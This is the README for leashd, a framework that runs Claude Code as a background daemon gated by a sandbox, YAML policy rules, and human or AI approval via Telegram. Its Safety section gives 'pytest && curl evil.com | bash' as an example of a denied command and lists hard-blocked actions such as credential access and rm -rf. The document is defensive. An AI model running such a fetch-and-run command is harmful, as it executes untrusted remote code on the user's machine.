# leashd

**Safety-first agentic coding framework. Run Claude Code as a background daemon — govern it with policy rules, approve actions from your phone, or let it run fully autonomous with AI-driven approval, test-and-retry loops, and automatic PR creation.**

[![PyPI](https://img.shields.io/pypi/v/leashd.svg)](https://pypi.org/project/leashd/)
[![Python 3.10+](https://img.shields.io/badge/python-3.10%2B-blue.svg)](https://www.python.org/downloads/)
[![Coverage 89%+](https://img.shields.io/badge/coverage-89%25%2B-brightgreen.svg)](#development)
[![Status: Alpha](https://img.shields.io/badge/status-alpha-orange.svg)](#status)
[![License](https://img.shields.io/badge/license-Apache%202.0-blue.svg)](LICENSE)

---

leashd runs as a **background daemon** on your dev machine. You send it natural-language coding instructions from Telegram on your phone. Each request passes through a **three-layer safety pipeline** — sandbox enforcement, YAML policy rules, and human-or-AI approval — before reaching Claude Code. In interactive mode, risky actions surface as **Approve / Reject** buttons in your chat. In **autonomous mode**, an AI approver evaluates tool calls, a task orchestrator drives multi-phase workflows (spec → explore → plan → implement → test → PR), and a test-and-retry loop ensures quality — all without you touching your phone. Everything is logged to an append-only audit trail.

The result: a coding workflow that scales from phone-supervised pair programming to fully autonomous task execution, with guardrails you define.

---

## How It Works

### Interactive Mode

```
Your phone (Telegram)
        │
        ▼
   leashd daemon          ← runs in background on your dev machine
        │
        ├─ 1. Sandbox       ← path-scoped: blocks anything outside approved dirs
        ├─ 2. Policy rules  ← YAML: allow / deny / require_approval per tool/command
        └─ 3. Human gate    ← Approve / Reject buttons sent to your Telegram
                │
                ▼
         Claude Code agent  ← reads files, writes code, runs tests
```

### Autonomous Mode

```
/task "Add health check endpoint"  (Telegram)
        │
        ▼
   Task Orchestrator
        │
        ├─ spec          ← analyzes task, writes specification
        ├─ explore        ← reads codebase structure and conventions
        ├─ validate       ← checks spec against codebase findings
        ├─ plan           ← creates implementation plan
        ├─ implement      ← writes code (file writes auto-approved)
        ├─ test           ← runs test suite via TestRunnerPlugin
        ├─ retry (×3)     ← fixes failures with exponential backoff
        └─ pr             ← creates PR via gh CLI
                │
                ▼
   You get a PR link — or an escalation message if the agent gets stuck
```

AI approval replaces human taps: a `claude -p` CLI call evaluates each `require_approval` tool call in context and decides automatically. Hard blocks (credentials, `rm -rf`, force push) can never be overridden.

Sessions are **multi-turn**: Claude remembers the full conversation context, so you can iterate naturally across messages ("now add tests for that", "rename it to X").

---

## Quick Start

### Prerequisites

- **Python 3.10+**
- **[Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code)** — installed and authenticated. The `claude` command must work in your terminal.
- **Telegram account** — to create a bot

### 1. Install

```bash
pip install leashd
```

Or with [uv](https://docs.astral.sh/uv/) (recommended):

```bash
uv tool install leashd
```

### 2. Create a Telegram bot

1. Open Telegram and search for **@BotFather**
2. Send `/newbot` and follow the prompts
3. Copy the **token** BotFather gives you (looks like `123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11`)
4. Message **@userinfobot** to get your numeric **user ID** (e.g. `981234567`) — this restricts the bot to only you

### 3. Run the setup wizard

```bash
leashd init
```

The wizard prompts you for your approved directory/directories and optional Telegram credentials, and writes `~/.leashd/config.yaml`. No manual config file editing needed.

### 4. Start the daemon

```bash
leashd start
```

leashd starts in the background. Check it with `leashd status`, stop it with `leashd stop`.

### 5. Start coding from your phone

Open Telegram, find your bot, and send something like:

> "Add a health check endpoint to the FastAPI app"

Claude starts working. When it needs to do something gated by policy (e.g. write a file), you'll get an **Approve / Reject** button in the chat.

---

## What's New in 0.6.0

**Autonomous task orchestrator** — send `/task Add a health check endpoint` from Telegram and the agent autonomously runs spec → explore → validate → plan → implement → test → PR. Comes back with a pull request or an escalation message. Crash recovery, per-phase cost tracking, and SQLite persistence built in. See the [Autonomous Setup Guide](docs/autonomous-setup-guide.md).

**AI-driven phase transitions** — an AI evaluator replaces brittle substring heuristics to decide whether to advance, retry, escalate, or complete between task phases.

**AI approval & plan review** — `AutoApprover` replaces human approval taps with a `claude -p` CLI evaluation. `AutoPlanReviewer` replaces manual plan review. Both have circuit breakers and full audit logging.

**Autonomous loop** — post-task test-and-retry with exponential backoff. After `/edit` tasks, the agent runs tests, retries on failure, and optionally creates a PR.

**Autonomous policy** — `autonomous.yaml` is purpose-built for autonomous mode. Hard blocks remain (credentials, `rm -rf`, force push), but dev tools, file writes, and test runners are auto-allowed.

**Agentic testing in task orchestrator** — the test phase uses `TestRunnerPlugin` for structured 9-phase testing instead of plain `pytest`, with API spec discovery (`.http`, `.rest`, `openapi.yaml/json`, `swagger.yaml/json`) for smarter test prompts.

**`/stop` command** — stop all ongoing work (agent, task, autonomous loop) without resetting the session.

**`leashd restart` & `leashd reload`** — restart the daemon or live-reload config via SIGHUP without downtime.

**`leashd autonomous` CLI** — guided setup, quick enable/disable for autonomous features. See [Autonomous Setup Guide](docs/autonomous-setup-guide.md).

**Compound command classification** — the policy engine now splits `&&`, `||`, and `;` chains and evaluates each segment independently, preventing policy evasion via compound commands.

**Workspace improvements** — `leashd ws add` merges directories into existing workspaces; `leashd ws remove <name> <dir>` removes specific directories; `CLAUDE.md` is loaded from all workspace directories via SDK `add_dirs`.

See [CHANGELOG.md](CHANGELOG.md) for the full history.

---

## Daemon Mode

leashd runs as a background process by default.

```bash
leashd start           # start daemon (background)
leashd start -f        # start in foreground (useful for debugging)
leashd status          # check if daemon is running
leashd stop            # graceful shutdown
leashd restart         # stop + start
leashd reload          # reload config without restart (SIGHUP)
leashd version         # print version and exit
```

Logs go to `~/.leashd/logs/app.log` by default. Set `LEASHD_LOG_DIR` to change the path.

---

## Autonomous Mode

Autonomous mode replaces manual approval taps and plan reviews with AI evaluation, adds a post-task test-and-retry loop, and drives multi-phase autonomous tasks through the task orchestrator. Send `/task <description>` from Telegram and come back to a PR — or an escalation message if the agent gets stuck.

```bash
leashd autonomous          # show current autonomous settings
leashd autonomous setup    # run autonomous config wizard
leashd autonomous enable   # quick-enable with defaults
leashd autonomous disable  # disable autonomous mode
```

### Three Guarantees

1. **Human-in-the-loop when it matters** — hard blocks (credentials, force push, `rm -rf`, `sudo`) can never be overridden by any approver. The AI approver only handles `require_approval` decisions, never `deny` decisions.
2. **Fail-safe defaults** — the AutoApprover fails closed (denies on error), the AutonomousLoop escalates to the human when retries are exhausted, and circuit breakers cap both approval calls and plan revisions per session.
3. **Full auditability** — every AI approval decision is logged with `approver_type` in the same append-only JSONL audit trail. No decision is invisible.

### Task Orchestrator vs Autonomous Loop

| Aspect | `/task` (Task Orchestrator) | `/edit` (Autonomous Loop) |
|---|---|---|
| **Use when** | Starting from scratch — "build feature X" | You know what to change — "fix the login bug" |
| **Phases** | spec → explore → validate → plan → implement → test → PR | Single-shot: implement → test → retry |
| **Planning** | Automatic spec and plan generation with validation | No planning — goes straight to implementation |
| **Crash recovery** | Full — resumes from current phase after restart | None — starts over |
| **Cost tracking** | Per-phase breakdown and total | Session-level only |

See the [Autonomous Setup Guide](docs/autonomous-setup-guide.md) for a full walkthrough and the [Autonomous Mode Reference](docs/autonomous-mode.md) for the technical details.

---

## Configuration

leashd uses a **layered config system** — each layer overrides the one before it:

```
~/.leashd/config.yaml   ← global base (managed by leashd init / leashd config)
.env in your project    ← per-project overrides
environment variables   ← highest priority
```

### First-time setup

```bash
leashd init
```

### Inspecting resolved config

```bash
leashd config
```

### Managing approved directories

```bash
leashd add-dir /path/to/project
leashd remove-dir /path/to/project
leashd dirs
```

### Full configuration reference

All settings are environment variables prefixed with `LEASHD_`. Set them in `~/.leashd/config.yaml`, a local `.env`, or export them directly.

| Variable | Default | Description |
|---|---|---|
| `LEASHD_APPROVED_DIRECTORIES` | **required** | Directories the agent can work in (comma-separated). Must exist. |
| `LEASHD_TELEGRAM_BOT_TOKEN` | — | Bot token from @BotFather. Without this, leashd runs in local CLI mode. |
| `LEASHD_ALLOWED_USER_IDS` | *(no restriction)* | Comma-separated Telegram user IDs that can use the bot. Empty = anyone. |
| `LEASHD_MAX_TURNS` | `150` | Max conversation turns per request. |
| `LEASHD_SYSTEM_PROMPT` | — | Custom system prompt for the agent. |
| `LEASHD_POLICY_FILES` | built-in `default.yaml` | Comma-separated paths to YAML policy files. |
| `LEASHD_APPROVAL_TIMEOUT_SECONDS` | `300` | Seconds to wait for approval tap before auto-denying. |
| `LEASHD_RATE_LIMIT_RPM` | `0` *(off)* | Max requests per minute per user. |
| `LEASHD_RATE_LIMIT_BURST` | `5` | Burst capacity for the rate limiter. |
| `LEASHD_STORAGE_BACKEND` | `sqlite` | `sqlite` (persistent) or `memory` (sessions lost on restart). |
| `LEASHD_STORAGE_PATH` | `.leashd/messages.db` | SQLite database path. |
| `LEASHD_LOG_LEVEL` | `INFO` | `DEBUG`, `INFO`, `WARNING`, or `ERROR`. |
| `LEASHD_LOG_DIR` | `~/.leashd/logs` | Directory for rotating JSON logs. |
| `LEASHD_AUDIT_LOG_PATH` | `.leashd/audit.jsonl` | Append-only audit log of all tool decisions. |
| `LEASHD_ALLOWED_TOOLS` | *(all)* | Allowlist of Claude tool names. Empty = all allowed. |
| `LEASHD_DISALLOWED_TOOLS` | *(none)* | Denylist of Claude tool names. |
| `LEASHD_STREAMING_ENABLED` | `true` | Progressive streaming updates in Telegram. |
| `LEASHD_STREAMING_THROTTLE_SECONDS` | `1.5` | Min seconds between message edits during streaming. |
| `LEASHD_AGENT_TIMEOUT_SECONDS` | `3600` | Agent execution timeout (60 minutes). |
| `LEASHD_DEFAULT_MODE` | `default` | Default session mode: `"default"`, `"plan"`, or `"auto"`. |
| `LEASHD_MCP_SERVERS` | `{}` | JSON dict of MCP server configurations. |
| `LEASHD_TASK_ORCHESTRATOR` | `false` | Enable multi-phase task orchestrator (`/task` command). |
| `LEASHD_TASK_MAX_RETRIES` | `3` | Max test-failure retries per task. |
| `LEASHD_TASK_PHASE_TIMEOUT_SECONDS` | `1800` | Max seconds per phase (30 minutes). |
| `LEASHD_INTERACTION_TIMEOUT_SECONDS` | `300` | Timeout for agent-user interactions (plan review, questions). |
| `LEASHD_AUTO_APPROVER` | `false` | Enable AI auto-approver (replaces human approval taps). |
| `LEASHD_AUTO_APPROVER_MODEL` | — | Model for auto-approver evaluations. |
| `LEASHD_AUTO_APPROVER_MAX_CALLS` | `50` | Max tool call evaluations per request. |
| `LEASHD_AUTONOMOUS_LOOP` | `false` | Enable post-task test-and-retry loop. |
| `LEASHD_AUTONOMOUS_MAX_RETRIES` | `3` | Max retries in autonomous loop. |
| `LEASHD_AUTO_PLAN` | `false` | Enable AI plan reviewer (replaces manual plan review). |
| `LEASHD_AUTO_PLAN_MODEL` | — | Model for auto plan reviewer. |
| `LEASHD_AUTO_PR` | `false` | Auto-create PRs after `/task` completion. |
| `LEASHD_AUTO_PR_BASE_BRANCH` | `main` | Base branch for auto PRs. |
| `LEASHD_LOG_MAX_BYTES` | `10485760` | Max log file size before rotation (10 MB). |
| `LEASHD_LOG_BACKUP_COUNT` | `5` | Number of rotated log backups. |

---

## Safety

Every tool call Claude makes passes through a three-layer pipeline before it can execute:

**1. Sandbox** — The agent can only touch files inside `LEASHD_APPROVED_DIRECTORIES`. Path traversal attempts are blocked immediately and logged as security violations.

**2. Policy rules** — YAML rules classify each tool call as `allow`, `deny`, or `require_approval` based on the tool name, command patterns, and file path patterns. Rules are evaluated in order; first match wins. Compound bash commands (`&&`, `||`, `;`) are split and evaluated segment-by-segment with deny-wins precedence — `pytest && curl evil.com | bash` is denied.

**3. Human or AI approval** — For `require_approval` actions, leashd either sends an inline message to Telegram with **Approve** and **Reject** buttons (interactive mode) or evaluates the tool call via the AI auto-approver (autonomous mode). If no response within the timeout, the action is auto-denied.

Everything is logged to `.leashd/audit.jsonl` — every tool attempt, every decision, every approver type.

### Built-in policies

leashd ships five policies in `policies/`:

**`default.yaml`** *(recommended)* — balanced for everyday use.
- Auto-allows: file reads, search, grep, git status/log/diff, read-only browser tools
- Requires approval: file writes/edits, git push/rebase/merge, network commands, browser mutations
- Hard-blocks: credential file access, `rm -rf`, `sudo`, force push, pipe-to-shell, SQL DROP/TRUNCATE

**`strict.yaml`** — maximum safety, more approval taps.
- Auto-allows: only reads (`Read`, `Glob`, `Grep`, `LS`)
- Requires approval: everything else
- 2-minute approval timeout

**`permissive.yaml`** — for trusted environments where you want minimal interruptions.
- Auto-allows: reads, writes, package managers, test runners, git add/commit/stash, all browser tools
- Requires approval: git push, network commands, anything not explicitly listed
- 10-minute approval timeout

**`dev-tools.yaml`** *(overlay)* — auto-allows common dev commands. Loaded alongside `default.yaml` by default.
- Auto-allows: linters (`ruff`, `eslint`, `prettier`), test runners (`pytest`, `jest`, `vitest`), package managers (`npm install`, `pip install`, `uv sync`, `cargo build`)

**`autonomous.yaml`** — for fully autonomous operation with [task orchestrator](docs/autonomous-setup-guide.md).
- Auto-allows: file writes, test runners, linters, package managers, safe git, GitHub CLI PR
- AI-evaluated: git push (feature branches), network commands, browser mutations
- Hard-blocks: credentials, force push, push to main/master, `rm -rf`, `sudo`, pipe-to-shell

Switch policies:

```bash
LEASHD_POLICY_FILES=policies/strict.yaml
```

Combine multiple policy files (rules merged, evaluated in order):

```bash
LEASHD_POLICY_FILES=policies/default.yaml,policies/my-overrides.yaml
```

---

## Telegram Commands

Once the daemon is running and your bot is set up, these slash commands are available in chat:

| Command | Description |
|---|---|
| `/plan <text>` | Switch to plan mode and start — Claude proposes, you approve before execution |
| `/edit <text>` | Switch to edit mode and start — direct implementation |
| `/default` | Switch back to balanced default mode |
| `/dir` | Switch working directory (inline buttons) |
| `/git <subcommand>` | Full git suite: status, branch, checkout, diff, log, add, commit, push, pull |
| `/test` | 9-phase agent-driven test workflow with browser automation |
| `/task <description>` | Autonomous multi-phase task: spec → explore → plan → implement → test → PR |
| `/tasks` | List active and recent tasks for the current chat |
| `/stop` | Stop all ongoing work (agent, task, loop) without resetting session |
| `/cancel` | Cancel the active task in the current chat |
| `/ws` | Manage workspaces inline |
| `/status` | Show current session, mode, and directory |
| `/clear` | Clear conversation history, cancel active tasks, and start fresh |

---

## Workspaces

Group related repositories under named workspaces for multi-repo context:

```bash
leashd ws add my-saas ~/src/api ~/src/web   # create a workspace
leashd ws add my-saas ~/src/worker           # add a dir to existing workspace
leashd ws list                               # list all workspaces
leashd ws show my-saas                       # inspect repos in a workspace
leashd ws remove my-saas ~/src/worker        # remove a dir from workspace
leashd ws remove my-saas                     # remove entire workspace
```

Workspaces are configured in `.leashd/workspaces.yaml` and inject context into the agent's system prompt automatically. `CLAUDE.md` files from all workspace directories are loaded via SDK `add_dirs`.

---

## Session Persistence

By default, sessions are stored in SQLite (`.leashd/messages.db`) and persist across daemon restarts — Claude remembers conversation context between sessions. Every message is stored with cost, duration, and session metadata.

For development or testing, use in-memory storage:

```bash
LEASHD_STORAGE_BACKEND=memory
```

---

## Browser Testing

leashd integrates with [Playwright MCP](https://github.com/playwright-community/mcp) to give Claude browser automation capabilities — navigating pages, clicking elements, taking snapshots, and generating Playwright tests — all gated by the safety pipeline.

**Prerequisites:** Node.js 18+ and a one-time browser install:

```bash
npx playwright install chromium
```

The `.mcp.json` at the project root pre-configures Claude Code to spawn the Playwright MCP server. Read-only browser tools (snapshots, screenshots) are auto-allowed in `default.yaml`; mutation tools (click, navigate, type) require approval.

**Typical workflow:**

1. Start your dev server (`npm run dev`, `uvicorn`, etc.)
2. In Telegram: `/test --url http://localhost:3000`
3. Claude navigates, verifies, and reports — each mutation tap needs your approval

See [docs/browser-testing.md](docs/browser-testing.md) for the full guide.

---

## Streaming

Telegram responses stream in real time — the message updates progressively as Claude types. While tools are running, you see a live indicator (e.g., `🔧 Bash: pytest tests/`). The final message includes a tool usage summary (e.g., `🧰 Bash ×3, Read, Glob`).

Disable with `LEASHD_STREAMING_ENABLED=false`.

---

## CLI Mode

No Telegram token? leashd falls back to a local REPL — useful for testing your config before going mobile:

```bash
# Don't set LEASHD_TELEGRAM_BOT_TOKEN, then:
leashd start -f
# > type your prompts here
```

Note: actions requiring approval are auto-denied in CLI mode since there's no approval UI.

---

## Logging

leashd uses [structlog](https://www.structlog.org/) for structured logging.

```bash
LEASHD_LOG_LEVEL=DEBUG     # full trace including policy decisions
LEASHD_LOG_LEVEL=INFO      # default — operational events
LEASHD_LOG_LEVEL=WARNING   # warnings and errors only
```

Enable file logging (JSON, rotating):

```bash
LEASHD_LOG_DIR=~/.leashd/logs
```

Key log event sequence at `INFO`:

```
engine_building → engine_built → daemon_starting → session_created →
request_started → agent_execute_started → agent_execute_completed →
request_completed
```

---

## Architecture

leashd's core is the **Engine**, which receives messages from connectors, runs them through middleware (auth, rate limiting), delegates to the Claude Code agent, and sends responses back. Every tool call the agent makes is intercepted by the **Gatekeeper**, which orchestrates the three-layer safety pipeline. An **EventBus** decouples subsystems — plugins subscribe to events like `tool.allowed`, `tool.denied`, `approval.requested`, and `task.submitted`. Connectors (Telegram, CLI) and storage backends (SQLite, memory) are swappable via protocol classes. The **TaskOrchestrator** and **AutonomousLoop** plug into the event bus as autonomous execution plugins.

```
Telegram connector
      │
   Middleware (auth, rate limit)
      │
   Engine ──── EventBus ──── TaskOrchestrator
      │                       AutonomousLoop
   Gatekeeper ──────────────────────────────┐
      │                                     │
   Claude Code agent             1. Sandbox check
      │                          2. Policy rule match
      └── tool call ──────────▶  3. Human / AI approval
```

---

## Development

```bash
# Clone and install (including dev dependencies)
git clone git@github.com:nodenova/leashd.git && cd leashd
uv sync

# Run tests
uv run pytest tests/
uv run pytest tests/test_policy.py -v          # single file
uv run pytest --cov=leashd tests/              # with coverage

# Lint and format
uv run ruff check .
uv run ruff check --fix .
uv run ruff format .
```

---

## Status

leashd is **alpha** — the API and config schema may change between versions. Core functionality (daemon, safety pipeline, Telegram integration, policy engine, task orchestrator) is stable and tested at 89%+ coverage. Not recommended for production environments where agent actions could have irreversible consequences without review.

If you hit a bug or have a feature idea, [open an issue](https://github.com/nodenova/leashd/issues).

---

## License

[Apache 2.0](LICENSE) — © NodeNova Ltd
